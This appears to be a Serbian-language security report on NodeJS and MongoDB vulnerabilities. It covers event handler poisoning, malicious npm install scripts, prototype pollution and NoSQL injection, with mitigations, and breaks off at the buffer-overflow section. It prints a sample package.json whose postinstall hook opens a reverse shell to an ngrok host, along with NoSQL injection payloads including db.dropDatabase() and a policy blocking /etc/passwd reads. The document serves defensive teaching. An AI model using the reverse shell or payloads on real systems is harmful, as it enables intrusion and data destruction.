# Analiza ranjivosti, napada i mitigacija za NodeJs i Mongo tehnologije

U narednim poglavljima biće prikazan deo sistema koji će biti analiziran, data stabla napada, kao i biti priložen propratni tekst za ta stabla.

U nastavku je naveden dijagram koji ističe deo sistema koji se analizira, koji uključuje serversku aplikaciju izgrađenu u NodeJS tehnologiji i MongoDB bazu podataka.

![Dijagram](/Dijagrami/NodeJsMongo/NodeMongo.jpg)

## NodeJs
NodeJs je jedna od najpopularnijih tehnologija koje se danas koriste za implementaciju backend sistema. Ono što ovu tehnologiju čini zanimljivom za analizu jeste njena modularnost, odnosno korišćenje Node Package Manager-a (NPM) za ubacivanje zavisnosti i paketa koji su drugi developeri implementirali. Dovoljno je da se u nekom od "čvorova" u lancu zavisnosti pronađe neka ranjivost, da bi se ta ranjivost kasnije eksploatisala u kranjem proizvodu. U nastavku sledi detaljan opis dve vrste ranjivosti i jedne vrste napada koji se mogu naći u softverima koji koriste ovu tehnologiju: Event Handler Poisoning vulnerability [[1]](#reference), Prototype Pollution Vulnerability [[2]](#reference), i Install-Time Attacks [[3]](#reference).

### Event Handler Poisoning
Suština napada koji eksploatišu ovu ranjivost jeste usporavanje rada niti koje opslužuju klijentske zahteve tako što se unose podaci koji teraju algoritme da obrađuju najgori mogući slučaj, umesto prosečni. NodeJs koristi arhitekturu vođenu događajima (Event driven architecture, EDA). EDA multipleksira mnoštvo klijentskih zahteva na mali broj Event Handler-a, da bi se umanjio gubitak performansi pri prelasku sa jedne na drugu nit (context switching overhead). Event handler-i se sastoje od jednonitnog Event Loop-a, kao i malog Worker pool-a koji služi za obradu skupih operacija. Nasuprot ove arhitekture, postoji i arhitektura u kojoj se svakom klijentu dodeljuje jedna nit (One Thread Per Client Architecture, OTPCA). Prednost ovakvog rešenja jeste izolovanost svakog klijenta, kao i smanjenje rizika pri usporenom radu jedne niti (ako nastane problem, nit se samo "uništava", i kreira se nova), dok je mana već pomenut gubitak performansi usled "skakanja" s jedne niti na drugu. 

Svi najpoznatiji serverski EDA radni okviri koriste asimetričnu multi-procesnu arhitekturu vođenu događajima. Operativni sistem, ili radni okvir događaje smeštaju u redove, a odgovarajuće callback funkcije se izvršavaju sekvencijalno od strane Event Loop-a. U slučaju obrada skupih zahteva, poput čitanja i pisanja u datoteku, Event Loop može da taj zahtev prosledi Worker Pool-u, koji nakon završetka vraća povratnu informaciju Event Loop-u. Za svaki callback mora biti zagarantovana atomičnost, odnosno njeno izvršavanje se uvek dešava u celosti. Ako se event handler "zaglavi", vreme provedeno u tom stanju je protraćeno. Rezultat je degradacija performansi sistema, a u najgorem slučaku i njegovo rušenje.

#### Opis napada
Činjenica da NodeJs koristi relativno mali broj niti (event handler-a) da opslužuje svoje klijente za posledicu ima to da ako zahtev od strane napadača natera nekog od handler-a da nedopustivo dugo vremena provede na njemu, može da uspori rad čitavog sistema, a čak može i da spreči opsluživanje ostalih klijenata. Vrsta ranjivosti koja omogućava ovakve napade naziva se Event Handler Poisoning (EHP), i relativno je česta kod NPM modula.

Napad se može izvesti nad Event Loop-om ili nad radnicima u Worker Pool-u. "Otrovani" Event Loop blokira čitav server, dok će svaki napadnuti Worker postepeno usporavati rad sistema. Napad je jedino moguć iz razloga što se resursi za izvršavanje dele. Kod OTPCA arhitekture blokirani klijent utiče samo na svoju nit, a radni okviri poput Apache nude hiljade event handler-a. Nasuprot tome, NodeJs Worker Pool može sadržati najviše 128 radnika. Potrošiti sve event handler-e u OTPCA sistemima se može postići samo DDoS napadom, dok se ista stvar u EDA sistemima može trivijalno postići ako se pronađe EHP ranjivost.

Sledi opis i pseudo kod za 2 primera napada: ReDos i ReadDos.

```
1 def serveFile ( name ) :
2 if name . match (/(\/.+) + $ /) : # ReDoS
3 data = await readFile ( name ) # ReadDoS
4 client . write ( data )
```

Regularni izraz u 2. liniji je ranjiv na ReDoS. String sačinjen od '/' karaktera, nakon kojih sledi nova linija zahteva eksponencijalno vreme za evaluaciju od strane NodeJs-ovog engina za regularne izraze, čime se truje Event Loop. Druga ranjivost prikazana je na 3. liniji. Server poseduje ranjivost pri obilasku direktorijuma, dozvoljava klijentima da čitaju proizvoljne datoteke. Ako napadač može da identifikuje datoteku koja prouzrokuje sporo člitanje, može da izvede ReadDos napad. Svaki ReadDos napad će otrovati radnika iz Worker Pool-a. Jedini način da se resursi oslobode bi bio da se server pokrene ponovo, čime bi se sve konekcije sa klijentima prekinule. Međutim, to nije rešenje za problem, jer napadač može ponovo da uputi maliciozni zahtev, čime bi se resursi opet zauzeli.

#### Mitigacije
EHP ranjivosti proizilaze od ranjivih API-a koji nemaju adekvatno implementirane mehanizme za paralelno izvršavanje. Ako servis ne može da ograniči vreme izvršavanja svojih funkcija, on poseduje EHP ranjivost. Postoje dva načina da se sistem odbrani u ovakvim situacijama: jedan način je da se ranjivi API refaktoriše, a drugi da se implementira način detekcije i "lečenja" otrovanog event handler-a. Sledi opis oba načina rešavanja problema, gde će fokus biti dat na drugom.

##### Sprečavanje putem particionisanja
Api je ranjiv ako postoji razlika između prosečne i najveće cene izvršavanja, uz to da je najgori slučaj nedopustiv. Servis može postići sigurnost statičkim ograničavanjem svakog od njegovih API-a, i onih koje poziva, i onih koje sam definiše. Na primer, developer bi mogao da particioniše svaki API u sekvencu faza koje imaju konstantno najduže vreme izvršavanja. Takva podela bi iz servisa uklonila EHP ranjivosti, jer bi ograničila sinhronu kompleksnost i vreme izvršavanja.

##### Otkrivanje i reagovanje koristeći timeout-ove
Umesto da statički ograničavamo kompleksnost API-a kroz refaktorisanje, isti rezultat možemo postići i dinamički, koristeći timeout-ove. Najgori slučaj pri izvršavanju bi postao irelevantan, jer nijedan callback ni task nebi mogao da prekorači vreme izvršavanja koje mu je dodeljeno. U ovom pristupu, svaki callback ili task koji se predugo izvršava se detektuje i prekida, bacajući TimeoutError, koji se baca iz sinhronog koda (callbacks) i vraća iz asinhronog koda (tasks). Problem kod ovog pristupa jeste izabrati odgovarajući prag vremena, jer preveliki prag i dalje dozvoljava napadaču da uspešno izvrši EHP napad, a premali bi mogao da prekine legitimne zahteve. 

Oba načina zahtevaju refaktorisanje, međutim timeout način iziskuje manje troškove, jer dodatak nogog try-catch bloka je dosta lakše postići nego ponovo implementirati funkcionalnosti da bi bile adekvatno particionisane. Iako je princip timeout-ova jednostavan, implementacija u pravom radnom okviru poput NodeJs-a je izazovno. Svaki deo NodeJs radnog okvira bi morao da emituje TimeoutError bez kompromitovanja stanja sistema, počev od samog jezika, do biblioteka i logike u samim aplikacijama, i u sinhronim i u asinhronim aspektima. Callback funkcija koja se predugo izvršava truje Event Loop, pa je potrebno baciti TimeoutError u takvom callback-u. Task koji se dugo izvršava truje Worker-a. Takav Worker mora biti prekinut i ispunjen putem TimeoutError-a.

#### Stablo napada
![Dijagram](/Dijagrami/NodeJsMongo/EventHandlerPoisoningAttackTreeV2.jpg)

### Install-Time Napadi
Suština ovakvih napada jeste ugrađivanje malicioznog koda u skriptama za instalaciju paketa od kojih drugi poznati paketi zavise. Kod se krije duboko u lancu zavisnosti tih paketa, i na taj način se propagira. Korisnik kada skine paket koji je kompromitovan, ili koji zavisi od nekog drugog kompromitovanog paketa neznajući pokreće neželjene skripte, a da paket nije ni instalirao niti importovao.

Većina npm paketa poseduje ograničene potrebe vezane za konfuguraciju, odnosno nije im potrebno ništa osim skidanja JavaScript izvornog koda i smeštanja tog koda na putanju koja je poznata projektu koji će da ga koristi. U praksi, međutim, postoje paketi koji zahtevaju pomoćne bootsrapping akcije tokom instalacije, kao što je pisanje konfiguracionih datoteka ili kompajliranje koda koji će kasnije biti korišćen. Da bi se čitav ovaj proces automatizovao, npm paketi imaju dozvolu da registruju shell skripte koje se pokreću kao odgovor na određene događaje tokom procesa instalacije. Konkretno, mogu registrovati preinstall skripte koje se pokreću pre instalacije paketa, kao i install i postinstall skripte koje se pokreću za vreme, kao i nakon što se instalacija završila. Čitav proces predstavljen je na slici ispod. Zbog ovog mehanizma moguće je sprovesti napad koji postiže narušavanje integriteta sistema, izvlačenje/uklanjanje kredencijala iz sistema, ometanje operacija host mašine, davanje pristupa žrtvinoj mašini napadačima. Ovo je moguće jer se skripte pokreću sa privilegijama korisnika koji ih je pokrenuo, koji često ima dozvolu da pristupi internetu.

![Slika1](/Dijagrami/NodeJsMongo/NpmPackageInstallatinActionOrder.jpg)


#### Opis napada
U mnogim repozitorijumima paketi su opremljeni rutinama koje dozvoljavaju bootsrapping. Skripte ubačene u ovakve bootsrap mehanizme, u najvećem broju slučajeva, se pokreću nakon instalacije paketa. Kao rezultat toga, napad može da bude izvršen a da paket nikada nije bio pokrenut, niti importovan od strane žrtve. Čak i kada te skripte nisu eksplicitno dizajnirane da proizvedu štetu, njihovo ponašanje može i dalje biti neželjeno od strane developera. Pomenute skripte se pokreću sa istim dozvolama kao i korisnik koji ih je pokrenuo, što dodatno pogoršava čitavu situaciju ako je korisnik ujedno i administrator.

Iako shell skripte nude znatnu fleksibilnost kod konfigurisanja paketa, takođe omogućavaju malicioznim paketima da ozbiljno naštete sistemima na kojim su instalirani. Sledi primer paketa koji u sebi sadrži malicioznu skriptu koja otvara reverse shell ka određenoj destinaciji na internetu.

<pre>
{
  "name": "twilio-npm",
  "version": "1.0.1",
  "description": "",
  "main": "index.js",
  "scripts": {
  "test": "echo \"Error: no test specified\" && exit 1",
  <span style="color:red"><b>"postinstall": "bash -i >& /dev/tcp/4.tcp.ngrok.io/11425
  0>&1"</b></span>
  },
  "author": "",
  "license": "ISC”
}
</pre>

#### Mitigacije
Novije verzije npm-a sadrže određene mitigacije za ovakve napade. Međutim, one često ne zadovoljavaju potrebe ni osoba koje rade na održavanju registra npm paketa, ni developera, jer ili kvare funkcionalnost paketa (na primer npm može biti iskonfigurisan da skroz ignoriše skripte prilikom instalacije, a koje mogu biti neophodne za rad paketa), ili stvaraju veliki teret na održavaoce registra (na primer nud npm audit opciju, koja prikazuje ručno označene bezbednosne probleme, a koja bi se morala ručno pokretati).

U domenu bezbednosti repozitorijuma paketa NodeSource nudi usluge za proveravanje npm paketa u formi sertifikovanih modula, tako što označava npm pakete i pridodaje informacije vezane za bezbednost. Cilj je da se omogući korisnicima da donesu informisane odluke vezane za rizike koje nosi instalacija paketa. Pored toga, ovaj servis nudi informacije o tome da li paket izvršava install-time skripte. Međutim, ne prikazuje detalje o tome šta te skripte zapravo rade. Package Analysis [[4]](#reference) je još jedan alat koji proverava open source pakete i eksportuje informacije o njihovom ponašanju. Iako ovaj alat daje uvid o ponašanju install skripti, ne poseduje nikakav mehanizam za presretanje i sprečavanje neželjenog ponašanja.

Pri implementaciji mitigacija važno je razdvojiti detekciju od sprovođenja, jer nisu svi bezbednosni problemi praktično relevantni u svim kontekstima. Potrebno je omogućiti dve stvari: dozvoliti održavaocima registra da spreče postavljanje malicioznih paketa na repozitorijum, i omogućiti korisnicima da kontrolišu ponašanje paketa pri njihovoj instalaciji. Operativno, politika održavaoca registra može biti primenjena u pozadini svaki put kada se paket otpremi na repozitorijum. Slično, svaki put kad korisnik unese <i>npm install p</i> komandu (gde je p ime nekog paketa), mora biti osigurano da paket p, kao i svi paketi od kojih on direktno ili indirektno zavisi, mogu da izvrše pri instalaciji samo one operacije koje je korisnik dozvolio. Izražavanje tih dozvola bi moglo biti omogućeno korišćenjem posebnog jezika specifičnog za domen. Ove dozvole funkcionišu na osnovu manifesta dozvola koje će određeni paket koristiti tokom svog procesa instalacije. Bitna stvar kod implementacije rešenja jeste to da radi bez saradnje sa individualnim autorima paketa. Konkretno, ne sme biti neophodno da se manifesti paketa deklarišu od strane autora. Razlog za to je što postoji ogroman broj paketa, pa tako nešto nebi bilo realno moguće sprovesti. Pored toga, ciljevi određenih autora ne moraju nužno da se poklapaju sa ciljevima korisnika. Dakle, sistem mora da izvede manifest određenog paketa, a zatim da obezbedi da se taj manifest poklapa sa korisnikovom politikom.

Sistem bi se izvršavao u 3 faze: u prvoj fazi se kreira manifest za paket koji se instalira, u drugoj se taj manifest poredi sa politikama koje je korisnik deklarisao, a u trećoj se install skripte paketa pokreću i izvršavaju pod zaštitom bezbednosnog modula na nivou kernela. Sledi prikaz toka izvršavanja sistema.

![Slika2](/Dijagrami/NodeJsMongo/InstallScriptSystemWorkflow.jpg)

##### Faza 1
U ovoj fazi se identifikuju svi paketi koji definišu install skripte i generiše manifest svih akcija koje se izvršavaju nad operativnim sistemom tokom poziva svake skripte. Ponašanje paketa koji se testira se nadgleda i snima u log datoteku, koja se nakon toga kompajlira u manifest. Nakon generisanja, manifest se skladišti u manifest bazu podataka i beleži se ime paketa i njegova verzija. Manifesti se generišu čak i kada se skripte sruše tokom izvršavanja. Važno je zabeležiti ponašanja problematičnih skripti, jer mogu izvršiti neželjene operacije pre nego što se sruše.

##### Faza 2
Kada korisnik želi da instalira paket, proverava se politika koju je korisnik definisao nasuprot manifesta tog paketa i njegovih zavisnosti koje se pokušavaju instalirati. Svaki manifest se dobavlja iz baze podataka. Tokom sprovođenja manifesta, pravila politike se evaluiraju u boolean vrednost (da li su ispunjena ili nisu). Sledi primer politike.

<pre>
{"<b>declarations</b>": [
  "<allRemoteHosts> = [remoteHosts_preinstall] ~union
  [remoteHosts_install] ~union
  [remoteHosts_postinstall]",
  "<allFilesRead> = [filesRead_preinstall] ~union
  [filesRead_install] ~union
  [filesRead_postinstall]",
  "<<passwdFile>> = '/etc/passwd’”],
  "<b>rules</b>": ["<allRemoteHosts> == {}",
  "!(<allFilesRead> ~anymatches [<<passwdFile>>])"]}
</pre>

Navedena su dva pravila, pravilo jedan sprečava uspostavljanje veze sa udaljenim serverima, dok pravilo dva sprečava čitanje datoteke koja se nalazi na <b><i>/etc/-passwd</i></b> putanji. Kada dođe do kršenja politike korisnik se obaveštava, i dobija informacije o tome koji paket je prouzrokovao prekršaj, kao i pravilo koje nije bilo ispoštovano.

##### Faza 3
U trećoj fazi se skripte izvršavaju pod zaštitom bezbednosnog modula. Primer takvog modula jeste AppArmor [[5]](#reference).

##### Podrazumevane politike
Iako svaki korisnik treba da ima mogućnost da deklariše svoje politike koje najviše odgovaraju njegovim potrebama, važno je implementirati i podrazumevane politike, kako bi korisnici sa što manje napora mogli da koriste sistem, pod uslovom da mu podrazumevane politike odgovaraju. S tim u vezi, postojale bi dve različite podrazumevane politike: za developere, kao i za održavaoce registra. Pravila politike namenjene developerima bi dozvoljavala skriptama da štampaju izlaze na terminal, kao i da čitaju datoteke koje nisu osetljive, dok bi zabranile uspostavljanje veze sa mrežnim serverima. Pravila politike namenjene održavaocima registra bi se odredila na osnovu algoritma za učenje, koji je formulisan na osnovu istorijskih povlačenja paketa od strane održavalaca npm-a.

#### Stablo napada
![Dijagram](/Dijagrami/NodeJsMongo/InstallTimeNapadAttackTreeV2.jpg)

### Prototype pollution
Prototype pollution je vrsta ranjivosti koja se javlja u jezicima kao što je JavaScript, što znači da su NodeJs aplikacije podložne napadima koji je eksploatišu. Suština napada na ovakvu ranjivost leži u manipulaciji prototipa objekata radi izazivanja neočekivanog ponašanja u aplikaciji. Kada se modifikuje prototip objekta, te promene se reflektuju na sve njegove instance. Ako se nevalidni ili zlonamerni podaci unesu u aplikaciju putem manipulacije prototipa, može doći i do rušenja aplikacije.

U JavaScript-u, svaki objekat ima svoj prototip. Prototip je u suštini šema ili templejt od kog drugi objekti nasleđuju svojstva. Kada se kreira objekat u JavaScript-u, taj objekat je povezan sa njegovim prototipom. Ako se neko svojstvo ili metoda ne pronađu u samom objektu, JavaScript ih traži u njegovom prototipu i nastavlja kroz lanac prototipova dok ih ne pronađe, ili dok ne naiđe na kraj lanca (uglavnom null). Prototipovi se koriste kod nasleđivanja. Objekti se mogu kreirati na osnovu drugih objekata i naslediti svojstva i metode od njihovih prototipova. Eksploatisanjem ove ranjivosti, napadač može izvršiti remote code execution, property injection, kao i denial of service.

#### Opis napada
U JavaScript izvršnom okruženju moguće je manipulisati važnim vrednostima objekata kako bi se promenio tok izvršavanja. Na serverskoj strani, kao u slučaju NodeJs-a, moguće je neželjeno izvršavanje proizvoljnog koda, što može izazvati ozbiljne sigurnosne probleme. Svi JavaScript tipovi podataka, izuzev "null" i "undefined" imaju različita prototip svojstva. Ako se prototip podaci određenog objekta, klase ili funkcije modifikuju, nove instance koje se kreiraju kroz konstruktor modifikovanog objekta, klase ili funkcije zadržaće modifikovana svojstva. Sledi primer koda koji poseduje prototype pollution ranjivost.

<pre>
1 var obj2 = new Object()
2 obj2.__proto__.polluted = true
3 var obj = new Object
4 console.log(obj.polluted) //true
5 console.log(polluted ) // true
</pre>

Kao što je u kodu prikazano, ako se svojstvo <b>"__proto__"</b> intsance klase Object dodeli ili modifikuje, to može uticati na svojstva novih instanci. U slučajevima kada postoji ranjivost, dvostruko referenciranje (na primer obj[a][b] = value) je neophodno, i to se postiže definisanjem prve vrednosti niza ("a" u obj[a][b]) kao "__proto__". Trostruko referenciranje (na primer obj[a][b][c] = value) takođe funkcioniše tako što se definiše prva vrednost niza ("a" u obj[a][b][c]) kao "constructor", i druge vrednosti niza ("b" u obj[a][b][c]) kao "prototype". Čak i u slučaju da ciljani objekat klase nije tipa Object, napad može da se izvrši tako što se "__proto__" svojstvo referencira nekoliko puta, kao što je prikazano u kodu ispod.

<pre>
1 class A { }
2 var obj = new A()
3 obj.__proto__.__proto__.polluted = true
4 console.log(polluted) // true
</pre>

Ako ciljana klasa nasleđuje neku drugu klasu, potrebno je "dublje" referenciranje, kao što je prikazano u kodu ispod.

<pre>
1 class A { }
2 class B extends A { }
3 var obj = new B()
4 obj.__proto__.__proto__.__proto__.polluted = true
5 console.log(polluted) // true
</pre>

Kao što je već spomenuto u uvodnoj sekciji, eksploatacijom prototype pollution ranjivosti može se izvršiti više napada, kao što je remote code execution, property injection, kao i denial of service. Remote code execution se može dogoditi kada izvorni kod evaluira i izvršava atribut nekog objekta. Na primer, napadač može izvršiti proizvoljan kod ako se atribut u argumentu funkcije <i>eval</i> "zagadi". Denial of service se može izvesti ako je napadač u stanju da zagadi generičke funkcije kao što je na primer "toString", koja je jedna od metoda klase Object. Slično, property injection se može izvršiti kada je napadač u mogućnosti da doda nova svojstva zagađivanjem prototipa objekta. Na primer, ako se bezbednosno svojstvo kao što je "Object.prototype.isAdmin" lažira i postavi na "true", napadač može da dobije privilegije admina.

#### Mitigacije
##### Mitigacija pomoću Object.hasOwnProperty
Metoda "Object.hasOwnProperty" se može iskoristiti da se proveri postojanje određenih svojstava ciljanog objekta. Kao posledica toga, čak iako postoji vrednost ključa tipa "constructor", referenciranje se može sprečiti. Koristeći ovaj način, za razliku od "in" operatora koji funkcioniše slično kao "Object.hasOwnProperty", developer može sprečiti referenciranje prototipa. Razlika između "Object.hasOwnProperty" i "in" operatora je prikazana u kodu ispod.

<pre>
1 let obj = { foo : 1};
2
3 obj.hasOwnProperty("foo"); //true
4 obj.hasOwnProperty("constructor"); // false
5 obj.hasOwnProperty("__proto__"); //false

7 "foo" in obj; // true
8 "__proto__" in obj ; // true
9 "constructor" in obj ; // true
</pre>

Sledi prikaz algoritma koji sprečava prototype pollution koristeći "Object.hasOwnProperty" funkciju.

<pre>
1: function vulnerable_A(obj, key, value)
2: keylist ← key.split(".")
3: e ← keylist.shift()
<span style="color:red">4: if !obj.hasOwnProperty(e) then
5:  return obj
6: end if</span>
7:  if keylist.length > 0 then
8:    if typeof(obj[e]) != "object" then
9:      obj[e] ← {}
10:     vulnerable_A(obj[e], keylist.join("."), value)
11:   end if
12:   else
13:     obj[e] ← value
14: end if
</pre>

##### Mitigacija postavljanjem vrednosti "__proto__" na praznu vrednost
Tipično, objekat se u JavaScript-u inicializuje na sledeći način: 

<pre>
1 let obj = {};
</pre>

Ako se objekat inicializuje na ovaj način, svojstvo "__proto__" od objekta "obj" iz koda iznad će se odnositi na prototip konstuktora Object. Ako napadač zagadi svojstvo "__proto__" objekta "obj", tada će biti zagađen i "Object.prototype". Pošto globalni objekat takođe nasleđuje "Object.prototype", ostali konteksti će se referisati na zagađeno svojstvo.

Glavni problem je to što se svojstvo "__proto__" od objekta odnosi na "Object.prototype", pa će zagađivanje svojstva "__proto__" takođe zagaditi ostale objekte. Dakle, ako stavimo da je vrednost svojstva "__proto__" prazna, developer može da otkloni referencu na "Object.prototype". Slede dva primera koji pokazuju kako da se "__proto__" inicializuje na null vrednost.

<pre>
1 let obj = {__proto__:null};
2 console.log(obj.__proto__); //undefined
</pre>

<pre>
1 let obj = Object.create(null);
2 console.log(obj.__proto__); //undefined
</pre>

##### Mitigacija filtriranjem po Keyname-u
Ovaj način otklanja prototype pollution ranjivost filtrirajući vrednosti ključeva sa određenim nazivima kao što su "prototype", "__proto__", i "constructor". Sledi prikaz algoritma koji ovo ilustruje.

<pre>
1: function vulnerable_A(obj, key, value)
2: keylist ← key.split(".")
3: e ← keylist.shift()
4: if keylist.length > 0 then
<span style="color:red">5:  if ["__proto__", "constructor", "prototype"].includes(e) then
6:    return false
7:  end if</span>
8:  if typeof(obj[e]) != "object" then
9:    obj[e] ← {}
10:     vulnerable_A(obj[e], keylist.join("."), value)
11:   end if
12: else
13:   obj[e] ← value
14: end if
</pre>

Sledi prikaz koda koji je bio zaista korišćen da se otkloni prototype pollution kod modula "dot-prop".

<pre>
1   const disallowedKeys = ["
        __proto__", " prototype" ,"
        constructor"];
2   const isValidPath =
        pathSegments => !
        pathSegments.some(segment =>
          disallowedKeys.includes(
        segment));
3   if (!isValidPath(parts)) return [];
</pre>

##### Mitigacija korišćenjem Prototype freezing-a
"Object.freeze" je ugrađena JavaScript funkcija koja objekte čini read-only. Primenom ove funkcije na objekat "Object.prototype", svojstva od "Object.prototype" postaju nepromenljiva, kao što je prikazano u kodu ispod.

<pre>
1     Object.freeze(Object.prototype);
2     Object.prototype.foo = true;
3     console.log(Object.prototype.
          foo); // undefined
</pre>

Važno je napomenuti da ovaj način može proizvesti ozbiljne greške u slučaju da se koriste biblioteke kojima je neophodno da mogu da menjaju prototipove objekata. Dakle, ovaj način nije adekvatan u svim situacijama.

#### Stablo napada
![Dijagram](/Dijagrami/NodeJsMongo/PrototypePollutionAttackTree.jpg)

## MongoDB
MongoDB je open-source NoSql baza podataka koja je napisana u C++-u i bazirana na dokumentima. Dokument je u BSON (Binary JSON) formatu, koji je dosta sličan JSON-u. MongoDB skladišti dokumente u kolekcijama. Koristi Map-reduce data processing paradigmu da pretvori velike količine podataka u korisne agregirane rezultate. Map-reduce je pandam group by operaciji u SQL-u. Za razliku od relacionih baza podataka, MongoDB ne poseduje statički tipiziranu šemu, te svaki dokument u kolekciji može posedovati različite atribute. Iako MongoDB ne podržava tradicionalne SQL upite, ima upite nad dokumentima pomoću kojih možemo pronaći podatke čije su vrednosti veće ili manje od neke određene vrednosti, ili koristiti regularne izraze za pretrage po obrascu. MongoDB se može skalirati unutar i između više distribuiranih data centara sa dobrim performansama, što ga čini poželjnijim za korišćenje u odnosu na relacione baze podataka.

U nastavku sledi detaljan opis tri vrste ranjivosti koje se mogu naći u softverima koji koriste ovu tehnologiju: NoSql Injection[[6]](#reference), Buffer Overflow[[7]](#reference), i JavaScript File Inclusion[[8]](#reference).

### NoSql Injection
NoSql injection se odnosi na ranjivost koju napadač može da eksploatiše tako što unese maliciozan tekst u nosql upit, čime je u stanju da promeni njegovo namenjeno ponašanje. Koncept NoSql injection-a je veoma sličan konceptu Sql injection-a, glavna razlika je u tome što NoSql baze podataka ne podržavaju jedan standardizovani jezik za upite, te samim tim upiti koji su dozvoljeni zavise od samog engine-a koji baza koristi, programskog jezika, kao i razvojnog okruženja. U najvećem broju slučajeva NoSql baze podržavaju tekstualne formate, prevashodno JSON, i dozvoljavaju korisniku da unese podatke u tom formatu. Ako taj korisnički unos nije adekvatno obrađen i "očišćen", napadač može doći do raznih informacija o bazi, do podataka koje ona skladišti, da njima manipuliše, a čak i da kompromituje čitav sistem. 

#### Opis napada
U ovoj sekciji biće prikazana 4 tipa NoSql injection-a: PHP Tautologies injection, Union Queries, JavaScript injections, i Piggy-backed queries.

##### PHP Tautologies Injection
Kao i kod SQL injection-a, NoSql takođe dozvoljava da se zaobiđe autentifikacija tako što se ubaci kod u conditional statement-u kako bi se proizveli izrazi koji su uvek istiniti. Sledi primer u kodu.

<pre>
db.logins.find({
username: { $ne: 1
}, password:{ $ne: 1 }
})
</pre>

U ovom primeru, kod koji je ubačen je: <pre>{ $ne: 1 }</pre> 

Upiti nalik ovom dobavljaju entitete čiji username i password nisu null. Napadači mogu da iskoriste operator "$ne" (notequal) da se prijave na sistem bez da znaju korisničko ime ili šifru.

##### Union Queries
Napadač koristi ranjiv parametar da izmeni podatke koji su trebali biti vraćeni kao rezultat nekog upita. OR uslov je iskorišćen da bi se vezao prazan izraz za korisnički unos. S obzirom da je prazan izraz uvek validan, provera šifre postaje beskorisna. Na primer, za sledeći format upita:

<pre>
string query = username: ‘" + post_username
+ ‘", password: ‘" + post_password + ‘" }"
</pre>

Konstruisan upit je:

<pre>
{ username: ‘tolkien’, password: ‘hobbit’ }
</pre>

Za maliciozni unos:

<pre>
username=tolkien’,$or: [ {}, {
‘a’:’a&password=’} ], $comment:’successful
MongoDB injection’
</pre>

Konstruisan upit je:

<pre>
{ username: ‘tolkien’, $or: [ {}, { ‘a’
: ‘a’ , password: ‘’ } ], $comment:
‘successful MongoDB injection’ }
</pre>

U ovom primeru, prazan upit {} je uvek istinit.

##### JavaScript Injection
NoSql baze podataka dozvoljavaju izvršavanje JavaScript koda kako bi obradile komplikovanije upite i transakcije. Ako korisnički unos nije filtriran ili validiran, postoji rizik od ubacivanja malicioznog JavaScript koda.

##### Piggy-backed Queries
U ovom primeru napadač koristi escape sekvence i specijalne karaktere kao što su carriage return [CR], line feed [LF], zatvorene zagrade, tačka-zareze, kako bi završili upit i potom ubacili maliciozne upite koji će se nakon toga izvršiti. Sledi primer koji ovo ilustruje.

Krajnji upit:

<pre>
db.doc.find({ username: ‘G. R. R.
Martin’});
db.dropDatabase();
db.insert({username: ‘dummy ’,password:
‘dummy ’})
</pre>

Originalni upit:

<pre>
db.doc.find({ username: ‘G. R. R. Martin’})
</pre>

Ubačeni kod:

<pre>
; db.dropDatabase();
db.insert({username: ‘dummy ’, password:
‘dummy’})
</pre>

U ovom primeru, nakon tačke-zareza, dodatan maliciozni upit je ubačen od strane napadača.

#### Mitigacije
U ovoj sekciji biće obrađena tri načina da se otklone NoSql injection ranjivosti, a to su: validacija unosa, adekvatna dodela dozvola korisnicima, kao i parametrizacija.

##### Validacija unosa
Svrha validacije unosa jeste da se ograniči korisnički unos i spreči izvršavanje neželjenih upita. Na primer, u MongoDB-u se polja za unos ograničavaju dodavanjem sledećeg koda:

<pre>
onkeypress = return"event.keyCode>=
48&&event.keyCode<=57"
</pre>

Ovim se prihvataju samo brojevi. Oznake, razmaci, ili određeni specifični znakovi se takođe proveravaju i filtriraju kako bi se izbeglo zlonamerno ubacivanje koda.

##### Adekvatna dodela dozvola
Adekvatno implementirana autorizacija je jedna od najbitnijih koraka koji moraju biti ispunjeni da bi se napravio bezbedan sistem. Samo autorizovan korisnik sme da ima pristup bazi podataka. Svaki korisnik treba da poseduje adekvatne dozvole koje zavise od njegove uloge u sistemu. Na primer, u sistemu koji upravlja podacima o prisustvu studenata, student može proveriti informacije o svom prisustvu, ali ne sme da ih menja. S druge strane, profesor može ažurirati prisustvo studenta.

##### Parametrizovani iskazi
Korisnički unos ne sme biti direktno ubačen u condition statement, i mora biti validiran i isfiltriran. U parametrizaciji, parametrizovani statement-i se koriste za prosleđivanje ulaznih promenljivih. Umesto ugrađivanja korisničkih unosa u condition statement, koriste se parametri. Ovaj mehanizam pomaže kod uklanjanja ranjivosti tako što razdvaja strukturu upita od samih podataka. Vezivanje korisničkog unosa je odvojeno od izvršavanja upita. Parametrizovani upiti automatski vrše "čišćenje" unosa. Pod tim se misli na adekvatno enkodovanje, escaping, kao i validaciju. Ovim se sprečava situacija u kojoj baza interpretira unos kao komandu. Čak i u slučaju da napadač pokuša da ubaci maliciozni kod u polje za unos, ubačen kod je tretiran kao tekst, a ne kao komanda koja se može izvršiti. Sledi kod koji proverava da li upit sadrži neki broj, i vraća grešku ako to nije slučaj.

<pre>
if(is numeric($usearchtwo)=="true"){} else
echo "Incorrect.";
</pre>

#### Stablo napada
![Dijagram](/Dijagrami/NodeJsMongo/NoSqlInjectionAttackTree.jpg)

### Buffer Overflow
Baferi su regioni u memoriji koji privremeno skladište podatke dok se oni premeštaju s jedne lokacije na drugu. Buffer overflow se dešava kada količina podataka prevazilazi kapacitet bafera. Program u tom slučaju pokušavajući da upiše podatke na željenu lokaciju (bafer), počinje da upisuje preko podataka susednih memorijskih lokacija (blokova).

Napadači koriste ovakve propuste u kodu kako bi menjali putanju izvršavanja aplikacije i pisali preko postojećih elemenata u memoriji, što može dovesti do gubitka postojećih datoteka, neželjene izloženosti podataka, izvršavanja malicioznog koda, i tako dalje. U prevodu, napadači koriste buffer overflow kako bi narušili izvršni stek aplikacije, izvršili proizvoljni kod, pa čak i preuzeli kontrolu nad mašinom žrtve. Napadi na ovakve vrste ranjivosti su i dalje dosta česti, iz razloga što im se uglavnom pridodaje manje pažnje u odnosu na druge napade, jer ih je teže otkriti i eksploatisati (napadač bi morao da poznaje raspored memorije programa, kao i detalje bafera).

Postoji nekoliko vrsta buffer overflow-a, a tri najpoznatije su: stek-bazirani, heap-bazirani i format string buffer overflow. MongoDB ranjivost koja će biti detaljno opisana u nastavku teksta poseduje dve slabosti: "nekorektna neutralizacija NUL bajtova i NUL karaktera", i "kopiranje bafera bez provere veličine unosa", koje spadaju u baffer overflow baziran na steku.

#### Opis napada
